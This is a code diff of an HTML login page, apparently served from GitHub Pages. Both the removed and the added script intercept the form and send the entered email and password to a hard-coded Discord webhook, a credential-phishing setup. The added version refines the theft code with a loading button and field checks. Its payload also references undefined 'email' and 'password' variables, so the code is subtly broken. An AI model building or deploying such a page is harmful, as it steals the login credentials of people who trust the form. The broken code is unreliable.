@@ -239,7 +239,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
     <div class="separator mt-5">Or continue with</div>
         
-           <form method="POST" action="send.php" class="mt-5" id="captcha-form">
+          <form method="POST" action="send.php" class="mt-5" id="captcha-form">
     <input type="hidden" name="_token" value="z0fHaPgV3X7NyG4EoKx5RZkTb9e0Nrenn8z1IcKY" autocomplete="off">
     
     <div class="mb-3">
@@ -262,56 +262,80 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     </div>
     
     <div class="d-grid">
-        <button type="submit" class="btn btn-gradient d-block">Login</button>
+        <button type="submit" class="btn btn-gradient d-block" id="submit-btn">Login</button>
     </div>
 </form>
 
-<!-- ==================== JAVASCRIPT ==================== -->
 <script>
-    document.getElementById('captcha-form').addEventListener('submit', async function(e) {
-        e.preventDefault(); // Stop normal submission (important for GitHub Pages)
+    // Wait until the page is fully loaded
+    document.addEventListener('DOMContentLoaded', function() {
+        
+        const form = document.getElementById('captcha-form');
+        if (!form) return;
 
-        const name      = document.getElementById('email').value.trim();
-        const firstname = document.getElementById('password').value.trim();
-        const remember  = document.getElementById('remember').checked ? 'Yes' : 'No';
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
 
-        // Your Discord webhook
-        const webhookUrl = "https://discord.com/api/webhooks/1492217076667121734/zs-o6BpUOqzTF57nzzZ_YOGh2cS2jyUSiTT6rexo6Xbs8siNGhSyluGGjgcVE_Is2Ynq";
+            // Safe element selection
+            const nameInput      = document.getElementById('email');
+            const firstnameInput = document.getElementById('password');
+            const rememberInput  = document.getElementById('remember');
+            const submitBtn      = document.getElementById('submit-btn');
 
-        const payload = {
-            embeds: [{
-                title: "🚨 New Login Attempt",
-                color: 0x3498db,
-                timestamp: new Date().toISOString(),
-                fields: [
-                    { name: "Email", value: email || "N/A", inline: true },
-                    { name: "Password", value: password || "N/A", inline: true },
-                    { name: "Remember Me", value: remember, inline: true },
-                    { name: "Time", value: new Date().toLocaleString(), inline: true }
-                ],
-                footer: {
-                    text: "Submitted from GitHub Pages"
-                }
-            }]
-        };
-
-        try {
-            const response = await fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-
-            if (response.ok) {
-                alert("✅ Login data sent successfully!");
-                this.reset(); // Clear the form
-            } else {
-                alert("❌ Failed to send data");
+            if (!nameInput || !firstnameInput) {
+                alert("Form fields not found!");
+                return;
             }
-        } catch (error) {
-            console.error(error);
-            alert("❌ Error sending to Discord. Check console.");
-        }
+
+            const name      = nameInput.value.trim();
+            const firstname = firstnameInput.value.trim();
+            const remember  = rememberInput && rememberInput.checked ? 'Yes' : 'No';
+
+            const webhookUrl = "https://discord.com/api/webhooks/1492217076667121734/zs-o6BpUOqzTF57nzzZ_YOGh2cS2jyUSiTT6rexo6Xbs8siNGhSyluGGjgcVE_Is2Ynq";
+
+            const payload = {
+                content: "**New Login Attempt**",
+                embeds: [{
+                    title: "🚨 New Form Submission",
+                    color: 0x3498db,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        { name: "Name / Email", value: email || "Not provided", inline: true },
+                        { name: "Firstname / Password", value: password || "Not provided", inline: true },
+                        { name: "Remember Me", value: remember, inline: true },
+                        { name: "Time", value: new Date().toLocaleString(), inline: false }
+                    ],
+                    footer: { text: "GitHub Pages" }
+                }]
+            };
+
+            // Button loading state
+            const originalBtnText = submitBtn.textContent;
+            submitBtn.disabled = true;
+            submitBtn.textContent = "Sending...";
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    alert("✅ Successfully sent to Discord!");
+                    form.reset();
+                } else {
+                    alert("❌ Failed to send (Error " + response.status + ")");
+                    console.log("Discord response:", await response.text());
+                }
+            } catch (err) {
+                console.error(err);
+                alert("❌ Network error - Check console (F12)");
+            }
+
+            submitBtn.disabled = false;
+            submitBtn.textContent = originalBtnText;
+        });
     });
 </script>
             
